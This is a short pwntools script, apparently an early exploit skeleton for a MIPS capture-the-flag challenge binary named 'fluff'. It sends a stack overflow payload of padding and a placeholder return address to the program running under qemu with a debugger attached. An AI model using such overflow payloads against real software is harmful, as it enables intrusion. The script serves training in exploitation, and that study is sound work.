from pwn import *

payload = b"".join([
    b"A"*(32+4),
    b"B"*4,
])

#p = process("./fluff_mipsel")
p = process(["qemu-mipsel", "-g", "1234", "fluff_mipsel"])
p.send(payload+b"\n")

p.interactive()
